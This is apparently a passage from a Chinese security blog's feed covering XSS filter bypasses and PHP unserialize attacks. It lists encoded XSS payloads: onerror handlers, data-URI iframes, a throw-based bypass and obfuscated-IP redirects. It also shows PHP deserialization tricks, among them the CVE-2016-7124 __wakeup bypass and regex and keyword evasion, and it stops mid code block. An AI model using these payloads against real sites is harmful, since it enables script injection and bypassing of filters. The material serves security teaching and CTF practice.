xss 攻击，如果我们能 fuzz 出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&lt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">2.<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=&lt;/<span class="attr">title</span>&gt;</span>&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(`xss`);&quot;</span>&gt;</span> //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> a=<span class="string">&quot;\\&quot;</span>;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);<span class="comment">//&quot;;</span></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过">#</a> 编码绕过</h4><h5 id="unicode编码绕过"><a class="markdownIt-Anchor" href="#unicode编码绕过">#</a> Unicode 编码绕过</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span><span class="symbol">&amp;#59;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="url编码绕过"><a class="markdownIt-Anchor" href="#url编码绕过">#</a> url 编码绕过</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="ascii码绕过"><a class="markdownIt-Anchor" href="#ascii码绕过">#</a> Ascii 码绕过</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="hex绕过"><a class="markdownIt-Anchor" href="#hex绕过">#</a> hex 绕过</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="八进制"><a class="markdownIt-Anchor" href="#八进制">#</a> 八进制</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="base64绕过"><a class="markdownIt-Anchor" href="#base64绕过">#</a> base64 绕过</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="3过滤引号"><a class="markdownIt-Anchor" href="#3过滤引号">#</a> 3. 过滤引号</h3><p>1. 如果是 html 标签中，我们可以不用引号。如果是在 js 中，我们可以用反引号代替单双引号</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure></div><p>2. 使用编码绕过，具体看上面我列举的例子</p><h3 id="4过滤括号"><a class="markdownIt-Anchor" href="#4过滤括号">#</a> 4. 过滤括号</h3><p>使用 throw 绕过</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;</span><br></pre></td></tr></table></figure></div><h3 id="5过滤url地址"><a class="markdownIt-Anchor" href="#5过滤url地址">#</a> 5. 过滤 url 地址</h3><h4 id="使用url编码"><a class="markdownIt-Anchor" href="#使用url编码">#</a> 使用 url 编码</h4><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="使用ip"><a class="markdownIt-Anchor" href="#使用ip">#</a> 使用 IP</h4><p>1. 十进制 IP</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>2. 八进制 IP</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>3.hex</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure></div><p>4.html 标签中用 <code>//</code>  可以代替 <code>http://</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure></div><p>6. 使用中文逗号代替英文逗号<br>如果你在你在域名中输入中文句号浏览器会自动转化成英文的逗号</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;document.location=`http://www。baidu。com`&quot;</span>&gt;</span>//会自动跳转到百度</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xss&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#xss&quot;&gt;#&lt;/a&gt; XSS&lt;/h1&gt;
&lt;h2 id=&quot;跨站脚本攻击&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#跨站脚本攻击&quot;&gt;#&lt;/a&gt; 跨站脚本攻</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP Unserialize</title>
    <link href="http://example.com/2024/04/09/PHP-Unserialize/"/>
    <id>http://example.com/2024/04/09/PHP-Unserialize/</id>
    <published>2024-04-09T13:51:55.000Z</published>
    <updated>2024-04-11T12:30:08.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php-unserialize"><a class="markdownIt-Anchor" href="#php-unserialize">#</a> PHP Unserialize</h1><h2 id="什么是序列化和反序列化"><a class="markdownIt-Anchor" href="#什么是序列化和反序列化">#</a> 什么是序列化和反序列化</h2><p><strong>serialize</strong> 将对象格式化成有序的字符串</p><p><strong>unserialize</strong> 将字符串还原成原来的对象</p><h3 id="serialize的特征"><a class="markdownIt-Anchor" href="#serialize的特征">#</a> serialize 的特征</h3><p>常见的序列化格式有</p><blockquote><p>二进制格式</p><p>字节数组</p><p>json 字符串</p><p>xml 字符串</p></blockquote><p>常见的数组样例</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br></pre></td></tr></table></figure></div><p>输出  <code>a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</span><br><span class="line">a:array代表是数组，后面的3说明有三个属性</span><br><span class="line">i:代表是整型数据int，后面的0是数组下标</span><br><span class="line">s:代表是字符串，后面的4是因为xiao长度为4</span><br></pre></td></tr></table></figure></div><p>数据类型对应提示符</p><p><code>字符串：s</code></p><p><code>已转义字符串：S</code></p><p><code>整数：i</code></p><p><code>布尔值： b</code></p><p><code>空值：N</code></p><p><code>数组：a</code></p><p><code>对象：O</code></p><p><code>引用： R</code></p><p>关于非公有字段名称:</p><ul><li><code>private</code>  使用：私有的类的名称 (考虑到继承的情况) 和字段名组合  <code>\x00类名称\x00字段名</code></li><li><code>protected</code>  使用:  <code>*</code>  和字段名组合  <code>\x00*\x00字段名</code></li></ul><h3 id="魔术方法"><a class="markdownIt-Anchor" href="#魔术方法">#</a> 魔术方法</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //执行serialize()时，先会调用这个函数</span><br><span class="line">__construct() //构造函数, 在对应对象实例化时自动被调用. #子类中的构    造函数不会隐式调用父类的构造函数.在 PHP 8 以前, 与类名同名      的方法可以作为 __constuct 调用但 __construct 方法优先</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br><span class="line">__debugInfo() //在使用 var_dump, print_r 时会被调用</span><br><span class="line">__set_state()   // 调用var_export()导出类时，此静态方法会被调用</span><br><span class="line">__clone()       // 当对象复制完成时调用</span><br><span class="line">__autoload()    // 尝试加载未定义的类</span><br></pre></td></tr></table></figure></div><h3 id="反序列化绕过"><a class="markdownIt-Anchor" href="#反序列化绕过">#</a> 反序列化绕过</h3><h4 id="php71反序列化对类属性不敏感"><a class="markdownIt-Anchor" href="#php71反序列化对类属性不敏感">#</a> php7.1 + 反序列化对类属性不敏感</h4><p>我们前面说了如果变量前是 protected，序列化结果会在变量名前加上 <code>\x00*\x00</code></p><p>但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有 <code>\x00*\x00</code>  也依然会输出 <code>abc</code></p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="绕过__wakeupcve-2016-7124"><a class="markdownIt-Anchor" href="#绕过__wakeupcve-2016-7124">#</a> 绕过__wakeup (CVE-2016-7124)</h4><p>版本：</p><blockquote><p>PHP5 &lt; 5.6.25</p><p>PHP7 &lt; 7.0.10</p></blockquote><p>利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup 的执行</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;666&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>如果执行 <code>unserialize('O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 <code>666</code></p><p>而把对象属性个数的值增大执行 <code>unserialize('O:4:&quot;test&quot;:2&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;');</code>  输出结果为 abc</p><h4 id="绕过部分正则"><a class="markdownIt-Anchor" href="#绕过部分正则">#</a> 绕过部分正则</h4><p><code>preg_match('/^O:\d+/')</code>  匹配序列化字符串是否是对象字符串开头，这在曾经的 CTF 中也出过类似的考点</p><blockquote><p>・利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）<br>・serialize (array (a) ) ; // a));//a));//a 为要反序列化的对象 (序列化结果开 头是 a，不影响作为数组元素的 $a 的析构)</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">match</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you lose!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">// +号绕过</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="comment">// serialize(array($a));</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure></div><h4 id="十六进制绕过字符匹配"><a class="markdownIt-Anchor" href="#十六进制绕过字符匹配">#</a> 十六进制绕过字符匹配</h4><p>可以使用十六进制搭配上已转义字符串来绕过对某些字符的检测</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name == <span class="string">&quot;flag&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You did it!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You can&#x27;t do it!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>这里检测了是否包含  <code>flag</code>  字符，我们可以尝试使用  <code>flag</code>  的十六进制  <code>\66\6c\61\67</code>  来绕过，构造以下:</p><p><code>'O:4:&quot;Read&quot;:1:&#123;s:4:&quot;name&quot;;S:4:&quot;\66\6c\61\67&quot;;&#125;'</code></p><p>可以用下面 python 脚本将字符串转化为 Hex</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>(<span class="string">&#x27;Enter a string: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\\&#x27;</span> + <span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>).<span class="built_in">hex</span>(<span class="string">&#x27;\\&#x27;</span>))</span><br></pre></td></tr></table></figure></div><h4 id="利用引用"><a class="markdownIt-Anchor" href="#利用引用">#</a> 利用‘引用’</h4><p>对于需要判断两个变量是否相等时，我们可以考虑使用引用来让两个变量始终相等.</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b= &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;a===<span class="variable language_">$this</span>-&gt;b)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="number">666</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure></div><p>上面这个例子将 <code>$b</code>  设置为 <code>$a</code>  的引用，可以使 <code>$a</code>  永远与 <code>$b</code>  相等</p><h4 id="php反序列化字符逃逸"><a class="markdownIt-Anchor" href="#php反序列化字符逃逸">#</a> php 反序列化字符逃逸</h4><h5 id="情况一过滤后字符过多"><a class="markdownIt-Anchor" href="#情况一过滤后字符过多">#</a> 情况一：过滤后字符过多</h5><p>例如以下情形：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span 